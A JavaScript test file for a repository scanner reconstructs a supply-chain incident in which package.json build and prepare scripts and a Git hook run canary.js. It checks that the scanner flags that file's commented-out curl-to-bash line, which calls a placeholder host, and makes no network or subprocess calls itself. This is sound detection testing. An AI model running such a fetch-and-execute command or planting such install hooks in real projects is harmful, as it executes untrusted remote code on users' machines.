'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');

const FIXTURES = path.join(__dirname, '../fixtures/incident-derived-reconstruction');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-incident-reconstruction-'));

function materialize(state, name) {
  const root = path.join(parent, name);
  fs.cpSync(path.join(FIXTURES, state), root, { recursive: true });
  fs.mkdirSync(path.join(root, '.git'));
  fs.copyFileSync(path.join(root, 'git-config.txt'), path.join(root, '.git', 'config'));
  if (state === 'present') fs.writeFileSync(path.join(root, 'canary.js'), [
    '// Incident-derived reconstruction: inert representative source text only.',
    '// Never execute this fixture; the original fetched payload remains unknown.',
    "// const { exec } = require('child_process');",
    '// exec(\'(curl -fsSL "http://incident-reconstruction.invalid/engagement/stage" | bash) || true\');',
    '',
  ].join('\n'));
  return root;
}

function snapshot(root, relative = '') {
  const result = {};
  for (const entry of fs.readdirSync(path.join(root, relative), { withFileTypes: true })) {
    const name = path.join(relative, entry.name);
    if (entry.isDirectory()) Object.assign(result, snapshot(root, name));
    else result[name] = crypto.createHash('sha256').update(fs.readFileSync(path.join(root, name))).digest('hex');
  }
  return result;
}

function withoutExternalActions(fn) {
  const originals = [];
  const calls = [];
  function intercept(module, name) {
    if (typeof module[name] !== 'function') return;
    originals.push([module, name, module[name]]);
    module[name] = () => { calls.push(name); throw new Error(`Fixture scan attempted external action: ${name}`); };
  }
  const childProcess = require('child_process');
  for (const name of ['spawn', 'spawnSync', 'exec', 'execSync', 'execFile', 'execFileSync', 'fork']) intercept(childProcess, name);
  intercept(childProcess.ChildProcess.prototype, 'spawn');
  for (const module of [require('http'), require('https')]) {
    for (const name of ['request', 'get']) intercept(module, name);
  }
  const net = require('net');
  for (const name of ['connect', 'createConnection']) intercept(net, name);
  intercept(net.Socket.prototype, 'connect');
  intercept(require('tls'), 'connect');
  intercept(require('http2'), 'connect');
  intercept(require('dgram'), 'createSocket');
  const dns = require('dns');
  for (const module of [dns, dns.promises]) {
    for (const name of Object.keys(module).filter(n => /^(?:lookup|resolve|reverse)/.test(n))) intercept(module, name);
  }
  intercept(globalThis, 'fetch');
  try {
    fn();
    assert.deepStrictEqual(calls, [], 'Incident-derived reconstruction scanning must launch no subprocesses and make no network requests');
  } finally {
    for (const [module, name, original] of originals.reverse()) module[name] = original;
  }
}

function verifyReferences(report, root, status) {
  const manifest = path.join(root, 'package.json');
  const hook = path.join(root, '.githooks', 'pre-commit');
  const target = path.join(root, 'canary.js');
  const refs = report.references.filter(r => r.reference === 'canary.js');
  assert.strictEqual(refs.length, 3, 'Build, prepare and representative hook must each retain a reference');
  assert.deepStrictEqual(refs.filter(r => r.path === manifest).map(r => r.line), [5, 6]);
  assert.ok(refs.some(r => r.path === hook && r.line === 3 && r.evidence === 'node canary.js'));
  assert.ok(refs.every(r => r.status === status && r.target === target));
  assert.ok(refs.some(r => r.evidence.includes('"build": "node canary.js && tsc"')));
  assert.ok(refs.some(r => r.evidence.includes('"prepare": "node canary.js"')));
  assert.ok(report.coverage.hookDirectories.some(r => r.path === path.dirname(hook) && r.configuredBy === path.join(root, '.git', 'config')));
  assert.strictEqual(report.complete, false, 'Unresolved tsc and excluded Git metadata must remain incomplete');
  assert.ok(report.unresolved.some(r => r.path === manifest && r.command === 'tsc'));
}

try {
  const root = materialize('present', 'repository');
  const removed = materialize('removed', 'removed-state');
  const temporary = path.join(parent, 'temporary', 'dev', 'shm');
  fs.mkdirSync(temporary, { recursive: true });
  fs.writeFileSync(path.join(temporary, 'canary.js'), [
    '// Incident-derived reconstruction: inert temporary-directory residue.',
    '// Represents a reported file under /dev/shm; original contents unknown.',
    '',
  ].join('\n'));
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8'));
  assert.deepStrictEqual(manifest.scripts, { build: 'node canary.js && tsc', prepare: 'node canary.js' });
  assert.ok(!fs.existsSync(path.join(removed, 'canary.js')));
  const before = snapshot(root);
  const temporaryBefore = snapshot(temporary);

  withoutExternalActions(() => {
    const { scanRepository } = require('../../src/core/repositoryScanner');
    const presentReport = scanRepository({ roots: [root] });
    verifyReferences(presentReport, root, 'exists');
    assert.ok(presentReport.findings.some(f => f.path === path.join(root, 'canary.js') && f.name === 'remote-to-shell' && f.line === 4 &&
      f.evidence.includes('http://incident-reconstruction.invalid/') && f.evidence.includes('| bash') && f.evidence.includes('|| true')));
    assert.ok(!presentReport.coverage.files.includes(path.join(temporary, 'canary.js')));
    assert.deepStrictEqual(snapshot(root), before, 'Present-state scan must leave all inputs unchanged');

    // Remove only the generated temporary copy; scanned source fixtures remain intact.
    fs.unlinkSync(path.join(root, 'canary.js'));
    const afterRemoval = snapshot(root);
    assert.deepStrictEqual(afterRemoval, snapshot(removed), 'Removed fixture must match deletion with all references retained');
    const missingReport = scanRepository({ roots: [root] });
    verifyReferences(missingReport, root, 'missing');
    assert.strictEqual(missingReport.unresolved.filter(r => r.reference === 'canary.js' && r.status === 'missing').length, 3);
    assert.ok(!missingReport.findings.some(f => f.name === 'remote-to-shell'), 'Missing payload content cannot be reconstructed from references');
    assert.deepStrictEqual(snapshot(root), afterRemoval, 'Missing-state scan must leave remaining inputs unchanged');

    const removedBefore = snapshot(removed);
    verifyReferences(scanRepository({ roots: [removed] }), removed, 'missing');
    assert.deepStrictEqual(snapshot(removed), removedBefore);

    const withTemporary = scanRepository({ roots: [root, temporary] });
    const residue = path.join(temporary, 'canary.js');
    verifyReferences(withTemporary, root, 'missing');
    assert.deepStrictEqual(withTemporary.roots, [root, temporary]);
    assert.ok(withTemporary.coverage.files.includes(residue));
    assert.ok(withTemporary.findings.some(f => f.path === residue && f.name === 'canary-indicator' && f.line === 1));
    assert.ok(!withTemporary.exclusions.some(r => r.path === residue || r.path === temporary));
    assert.deepStrictEqual(snapshot(root), afterRemoval);
    assert.deepStrictEqual(snapshot(temporary), temporaryBefore);
  });
  console.log('  incident-derived reconstruction: present/deleted targets, hooks and explicit temporary root passed; zero subprocess/network calls');
} finally { fs.rmSync(parent, { recursive: true, force: true }); }
